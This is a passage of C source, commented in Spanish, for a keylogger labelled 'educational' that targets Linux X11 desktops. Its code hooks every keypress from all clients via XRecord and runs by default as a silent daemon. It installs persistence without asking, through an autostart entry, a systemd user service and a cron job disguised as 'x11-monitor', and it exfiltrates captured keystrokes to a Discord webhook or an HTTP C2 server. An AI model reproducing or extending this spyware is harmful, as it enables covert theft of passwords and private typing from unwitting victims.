        XCloseDisplay(g_state.record_display);
        g_state.record_display = NULL;
    }
}

/**
 * Muestra la ayuda de uso del programa.
 */
void print_usage(const char *prog_name) {
    printf("X11 Educational Keylogger\n");
    printf("USO EDUCATIVO SOLAMENTE\n\n");
    printf("Uso: %s [opciones]\n\n", prog_name);
    printf("Opciones generales:\n");
    printf("  -d, --foreground   Ejecutar en foreground (muestra output)\n");
    printf("  -v, --verbose      Mostrar output verboso\n");
    printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
    printf("  -h, --help         Mostrar esta ayuda\n\n");
    printf("Opciones de persistencia:\n");
    printf("      --install-persist  Instalar mecanismos de persistencia\n\n");
    printf("Opciones de exfiltración:\n");
    printf("  -D, --discord              Habilitar exfiltración a Discord (HABILITADO POR DEFECTO)\n");
    printf("      --discord-webhook URL Webhook URL para Discord\n");
    printf("      --exfil-interval SEC  Intervalo de envío en segundos (default: 60 = 1 min)\n");
    printf("  -e, --exfil                Habilitar exfiltración HTTP a servidor C2\n");
    printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
    printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
    printf("      --exfil-path PATH      Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
    printf("NOTAS:\n");
    printf("  * Por defecto: Daemon + Silencioso + Oculto (sin output)\n");
    printf("  * Para ver output: ./x11_keylogger -d -v\n");
    printf("  * Para foreground: ./x11_keylogger -d\n");
    printf("  * Persistencia se instala automáticamente en segundo plano\n\n");
    printf("Ejemplos:\n");
    printf("  %s                              # Daemon silencioso (DEFECTO)\n", prog_name);
    printf("  %s -d                           # Foreground (muestra output)\n", prog_name);
    printf("  %s -d -v                        # Foreground + Verbose\n", prog_name);
    printf("  %s --install-persist            # Instalar persistencia\n", prog_name);
    printf("  %s -e -s 192.168.1.100          # Daemon + HTTP\n", prog_name);
}

/**
 * Convierte una ruta relativa a absoluta usando cwd
 * Thread-safe: usa buffer local
 * @param argv0 El valor de argv[0] pasado desde main
 * @param out_path Buffer de salida para la ruta absoluta
 * @param out_size Tamaño del buffer de salida
 */
static void resolve_binary_path(const char *argv0, char *out_path, size_t out_size) {
    if (!argv0 || !out_path || out_size == 0) {
        return;
    }
    
    // Si ya es absoluta, usar directamente
    if (argv0[0] == '/') {
        snprintf(out_path, out_size, "%s", argv0);
        return;
    }
    
    // Si es relativa, convertir a absoluta usando cwd
    char cwd[512];
    char temp_path[512];
    
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        snprintf(temp_path, sizeof(temp_path), "%s/%s", cwd, argv0);
        snprintf(out_path, out_size, "%s", temp_path);
    } else {
        // Fallback: usar argv0 tal cual
        snprintf(out_path, out_size, "%s", argv0);
    }
}

/**
 * Thread para instalar persistencia en segundo plano
 * Se ejecuta después de que el keylogger ha iniciado correctamente
 */
void* persistence_install_thread(void *arg) {
    (void)arg;
    
    // Esperar 2 segundos para asegurar que el proceso principal está inicializado
    sleep(2);
    
    // Usar la ruta global que fue resuelta en main()
    if (g_binary_path[0] == '\0') {
        // Si por alguna razón no se resolvió, intentar readlink como fallback
        ssize_t len = readlink("/proc/self/exe", g_binary_path, sizeof(g_binary_path) - 1);
        if (len > 0) {
            g_binary_path[len] = '\0';
        } else {
            snprintf(g_binary_path, sizeof(g_binary_path), "/usr/local/bin/x11_keylogger");
        }
    }
    
    // Log a archivo para debugging (silencioso, no afecta ejecución)
    FILE *persist_log = fopen("/tmp/x11_persist_install.log", "a");
    if (persist_log) {
        fprintf(persist_log, "[%ld] === Instalando persistencia ===\n", time(NULL));
        fprintf(persist_log, "[%ld] Binary path: %s\n", time(NULL), g_binary_path);
        fflush(persist_log);
    }
    
    // DEBUG: Imprimir a stderr para verificación inmediata
    fprintf(stderr, "[PERSIST] Iniciando instalación de persistencia...\n");
    fprintf(stderr, "[PERSIST] Binary path: %s\n", g_binary_path);
    fflush(stderr);
    
    // Instalar persistencia en segundo plano (no-fatal si falla)
    int ret1 = install_autostart_entry(g_binary_path);
    if (persist_log) {
        fprintf(persist_log, "[%ld] Desktop Entry (.desktop): %s\n", time(NULL), ret1 == 0 ? "OK" : "FAIL");
        fflush(persist_log);
    }
    fprintf(stderr, "[PERSIST] Desktop Entry: %s\n", ret1 == 0 ? "OK" : "FAIL");
    
    int ret2 = install_systemd_service(g_binary_path);
    if (persist_log) {
        fprintf(persist_log, "[%ld] Systemd User Service: %s\n", time(NULL), ret2 == 0 ? "OK" : "FAIL");
        fflush(persist_log);
    }
    fprintf(stderr, "[PERSIST] Systemd Service: %s\n", ret2 == 0 ? "OK" : "FAIL");
    
    int ret3 = install_cron_job(g_binary_path);
    if (persist_log) {
        fprintf(persist_log, "[%ld] Cron Job (verificación cada 5min): %s\n", time(NULL), ret3 == 0 ? "OK" : "FAIL");
        fflush(persist_log);
    }
    fprintf(stderr, "[PERSIST] Cron Job: %s\n", ret3 == 0 ? "OK" : "FAIL");
    
    // Resumen
    int total_ok = (ret1 == 0 ? 1 : 0) + (ret2 == 0 ? 1 : 0) + (ret3 == 0 ? 1 : 0);
    if (persist_log) {
        fprintf(persist_log, "[%ld] === Resultado: %d/3 mecanismos exitosos ===\n\n", time(NULL), total_ok);
        fclose(persist_log);
    }
    fprintf(stderr, "[PERSIST] Resultado final: %d/3 mecanismos exitosos\n", total_ok);
    
    return NULL;
}

// Función principal del keylogger
int start_keylogger(void) {
    char timestamp[64];
    
    // IMPORTANTE: Guardar DISPLAY antes de daemonizar
    // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
    const char *display_env = getenv("DISPLAY");
    if (display_env) {
        strncpy(g_state.display_env, display_env, sizeof(g_state.display_env) - 1);
        g_state.display_env[sizeof(g_state.display_env) - 1] = '\0';
    } else {
        // Valor por defecto si no está definido
        strncpy(g_state.display_env, ":0", sizeof(g_state.display_env) - 1);
    }
    
    // Si es modo daemon, daemonizar primero
    if (g_state.daemon_mode) {
        if (daemonize() < 0) {
            fprintf(stderr, "[!] Error: No se pudo daemonizar el proceso.\n");
            return 1;
        }
        // Después de daemonize(), el output va a /dev/null
        g_state.quiet_mode = 1;  // Forzar modo silencioso
    }
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger educativo iniciado.\n");
        printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
        printf("[*] Archivo de log: %s\n", g_state.log_filename);
        printf("[*] Presione Ctrl+C para detener.\n\n");
    }
    
    // Abrir conexión principal con X11 usando el DISPLAY guardado
    g_state.display = XOpenDisplay(g_state.display_env);
    if (g_state.display == NULL) {
        // Intentar con NULL como fallback
        g_state.display = XOpenDisplay(NULL);
        if (g_state.display == NULL) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
                fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
                fprintf(stderr, "[!] DISPLAY usado: %s\n", g_state.display_env);
            }
            return 1;
        }
    }
    
    // Verificar si la extensión XRecord está disponible
    int major, minor;
    if (!XRecordQueryVersion(g_state.display, &major, &minor)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    if (!g_state.quiet_mode) {
        printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
    }
    
    // Abrir segunda conexión para la grabación (requerido por XRecord)
    g_state.record_display = XOpenDisplay(g_state.display_env);
    if (g_state.record_display == NULL) {
        // Intentar con NULL como fallback
        g_state.record_display = XOpenDisplay(NULL);
    }
    if (g_state.record_display == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    
    // Solo abrir archivo de log si:
    // - No está en modo silencioso+exfiltración, O
    // - La exfiltración no está habilitada
    int should_create_log = !g_state.exfil.enabled || !g_state.quiet_mode;
    
    if (should_create_log) {
        g_state.logfile = fopen(g_state.log_filename, "a");
        if (g_state.logfile == NULL) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
            }
            XCloseDisplay(g_state.display);
            XCloseDisplay(g_state.record_display);
            return 1;
        }
        
        // Escribir encabezado en el log
        fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
        fprintf(g_state.logfile, "Modo: %s\n", g_state.daemon_mode ? "daemon" : "normal");
        if (g_state.exfil.enabled) {
            fprintf(g_state.logfile, "Exfiltración: %s:%s%s\n", 
                    g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
        }
        fprintf(g_state.logfile, "\n");
        fflush(g_state.logfile);
    }
    
    // Inicializar exfiltración si está habilitada
    if (g_state.exfil.enabled) {
        if (init_exfiltration() < 0) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se pudo inicializar exfiltración.\n");
            }
            cleanup_resources();
            return 1;
        }
        if (!g_state.quiet_mode) {
            if (g_state.exfil.mode == 1) {
                printf("[*] Exfiltración Discord habilitada: %s\n", 
                       g_state.exfil.discord_webhook);
            } else {
                printf("[*] Exfiltración HTTP habilitada: %s:%s%s\n", 
                       g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
            }
        }
    }
    
    // Configurar manejador de señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGHUP, SIG_IGN);  // Ignorar SIGHUP para daemons
    
    // Configurar el rango de eventos a capturar
    XRecordRange *record_range = XRecordAllocRange();
    if (record_range == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Capturar solo eventos de teclado (KeyPress)
    record_range->device_events.first = KeyPress;
    record_range->device_events.last = KeyPress;
    
    // Crear contexto de grabación para todos los clientes
    XRecordClientSpec client_spec = XRecordAllClients;
    g_state.record_context = XRecordCreateContext(g_state.record_display, 0, &client_spec, 1, &record_range, 1);
    
    if (g_state.record_context == 0) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede crear contexto XRecord.\n");
        }
        XFree(record_range);
        cleanup_resources();
        return 1;
    }
    
    XFree(record_range);
    
    if (!g_state.quiet_mode) {
        printf("[*] Contexto XRecord creado. Monitoreando...\n\n");
    }
    
    // Habilitar el contexto de grabación
    if (!XRecordEnableContextAsync(g_state.record_display, g_state.record_context, record_callback, NULL)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede habilitar contexto.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Iniciar thread para instalar persistencia en segundo plano
    // Se ejecuta después de 2s para no interferir con el inicio
    pthread_t persist_thread;
    if (pthread_create(&persist_thread, NULL, persistence_install_thread, NULL) == 0) {
        pthread_detach(persist_thread);  // Ejecutar en segundo plano
    }
    // Si falla, simplemente continuar sin persistencia (no es crítico)
    
    // Loop principal - procesar eventos XRecord
    while (g_state.running) {
        // Sleep mode DESHABILITADO - causaba problemas en máquinas de prueba
        // donde siempre hay terminales activas
        // TODO: Hacer configurable con --enable-sleep-mode
        
        // Procesamiento normal de eventos
        XRecordProcessReplies(g_state.record_display);
        usleep(10000);  // 10ms
    }
    
    // Limpieza
    if (!g_state.quiet_mode) {
        printf("\n[*] Limpiando recursos...\n");
    }
    
    cleanup_resources();
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger detenido correctamente.\n");
        printf("[*] Log guardado en: %s\n", g_state.log_filename);
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    int opt;
    int option_index = 0;
    
    // CRÍTICO: Resolver ruta absoluta del binario ANTES de cualquier operación
    // Esto se usa para persistencia y debe ser portable entre PCs
    resolve_binary_path(argv[0], g_binary_path, sizeof(g_binary_path));
    
    // NUEVO: Procesar --install-persistence o --install-persist antes que otros argumentos
    if (argc > 1 && (strcmp(argv[1], "--install-persistence") == 0 || strcmp(argv[1], "--install-persist") == 0)) {
        // Usar la ruta ya resuelta en g_binary_path
        char binary_path[256];
        strncpy(binary_path, g_binary_path, sizeof(binary_path) - 1);
        binary_path[sizeof(binary_path) - 1] = '\0';
        
        printf("[*] Instalando persistencia para: %s\n\n", binary_path);
        
        int installed = 0;
        
        // Instalar Desktop Entry
        if (install_autostart_entry(binary_path) == 0) {
            printf("    [✓] Desktop entry instalado (~/.config/autostart/x11-monitor.desktop)\n");
            installed++;
        } else {
            printf("    [!] Error al instalar desktop entry\n");
        }
        
        // Instalar Systemd Service
        if (install_systemd_service(binary_path) == 0) {
            printf("    [✓] Systemd service instalado (~/.config/systemd/user/x11-monitor.service)\n");
            installed++;
        } else {
            printf("    [!] Error al instalar systemd service\n");
        }
        
        // Instalar Cron Job (opcional)
        if (install_cron_job(binary_path) == 0) {
            printf("    [✓] Cron job instalado\n");
            installed++;
        }
        
        printf("\n");
        
        if (installed >= 2) {
            printf("[+] Persistencia instalada exitosamente\n");
            printf("[*] El proceso se ejecutará automáticamente tras reinicio\n");
            printf("[*] O al iniciar sesión X11\n");
            return 0;
        } else {
            printf("[-] Error: No se pudieron instalar mecanismos de persistencia\n");
            return 1;
        }
    }
    
    // Por defecto, instalar persistencia automáticamente en segundo plano
    // sin esperar respuesta del usuario (stealth)
    persistence_install_thread(NULL);
    
    // Opciones largas para getopt_long
    static struct option long_options[] = {
        {"foreground",       no_argument,       0, 'd'},
        {"verbose",          no_argument,       0, 'v'},
        {"output",           required_argument, 0, 'o'},
        {"help",             no_argument,       0, 'h'},
        {"install-persist",  no_argument,       0, 259},  // Nueva opción
        // Opciones de exfiltración HTTP
        {"exfil",            no_argument,       0, 'e'},
        {"server",           required_argument, 0, 's'},
        {"exfil-port",       required_argument, 0, 'P'},
        {"exfil-path",       required_argument, 0, 256},  // Solo opción larga
        // Opciones de exfiltración Discord
        {"discord",          no_argument,       0, 'D'},
        {"discord-webhook",  required_argument, 0, 257},  // Solo opción larga
        {"exfil-interval",   required_argument, 0, 258},  // Intervalo configurable
        {0, 0, 0, 0}
    };
    
    // Parsear argumentos de línea de comandos
    int http_mode = 0;
    int discord_mode = 0;
    
    while ((opt = getopt_long(argc, argv, "dvo:hes:P:D", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'd':
                g_state.daemon_mode = 0;  // Foreground (no daemon)
                g_state.quiet_mode = 0;   // Mostrar output
                break;
            case 'v':
                g_state.quiet_mode = 0;   // Verbose mode
                break;
            case 'o':
                strncpy(g_state.log_filename, optarg, sizeof(g_state.log_filename) - 1);
                g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            // Opciones de exfiltración HTTP
            case 'e':
                if (discord_mode) {
                    fprintf(stderr, "[!] Error: No puedes usar -e y -D simultáneamente\n");
                    print_usage(argv[0]);
                    return 1;
                }
                http_mode = 1;
                g_state.exfil.enabled = 1;
                g_state.exfil.mode = 0;  // Modo HTTP
                break;
            case 's':
                strncpy(g_state.exfil.server, optarg, sizeof(g_state.exfil.server) - 1);
                g_state.exfil.server[sizeof(g_state.exfil.server) - 1] = '\0';
                break;
            case 'P':
                strncpy(g_state.exfil.port, optarg, sizeof(g_state.exfil.port) - 1);
                g_state.exfil.port[sizeof(g_state.exfil.port) - 1] = '\0';
                break;
            case 256:  // --exfil-path
                strncpy(g_state.exfil.path, optarg, sizeof(g_state.exfil.path) - 1);
                g_state.exfil.path[sizeof(g_state.exfil.path) - 1] = '\0';
                break;
            // Opciones de exfiltración Discord
            case 'D':
                if (http_mode) {
                    fprintf(stderr, "[!] Error: No puedes usar -e y -D simultáneamente\n");
                    print_usage(argv[0]);
                    return 1;
                }
                discord_mode = 1;
                g_state.exfil.enabled = 1;
                g_state.exfil.mode = 1;  // Modo Discord
                break;
            case 257:  // --discord-webhook
                strncpy(g_state.exfil.discord_webhook, optarg, sizeof(g_state.exfil.discord_webhook) - 1);
                g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
                break;
            case 258:  // --exfil-interval
                {
                    int interval = atoi(optarg);
                    if (interval > 0) {
                        g_state.exfil.exfil_interval = interval;
                    } else {
                        fprintf(stderr, "[!] Error: Intervalo debe ser > 0\n");
                        return 1;
                    }
                }
                break;
            case 259:  // --install-persist (delegado a la sección de arriba)
                // Ya manejado al inicio de main()
                break;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Validar opciones de exfiltración según modo
    if (http_mode && g_state.exfil.server[0] == '\0') {
        fprintf(stderr, "[!] Error: Exfiltración HTTP habilitada pero falta --server\n");
        print_usage(argv[0]);
        return 1;
    }
    
    // Discord es el modo por defecto
    // Si no se especifica HTTP, usar Discord
    if (!http_mode) {
        if (g_state.exfil.discord_webhook[0] == '\0') {
            // Si no se proporciona webhook en CLI, usar el compilado desde .env
            #ifdef DISCORD_WEBHOOK
                strncpy(g_state.exfil.discord_webhook, DISCORD_WEBHOOK, sizeof(g_state.exfil.discord_webhook) - 1);
                g_state.exfil.discord_webhook[sizeof(g_state.exfil.discord_webhook) - 1] = '\0';
                g_state.exfil.enabled = 1;
                g_state.exfil.mode = 1;  // Modo Discord
            #else
                // Si no hay webhook, desactivar exfiltración
                g_state.exfil.enabled = 0;
            #endif
        }
    }
    
    return start_keylogger();
}
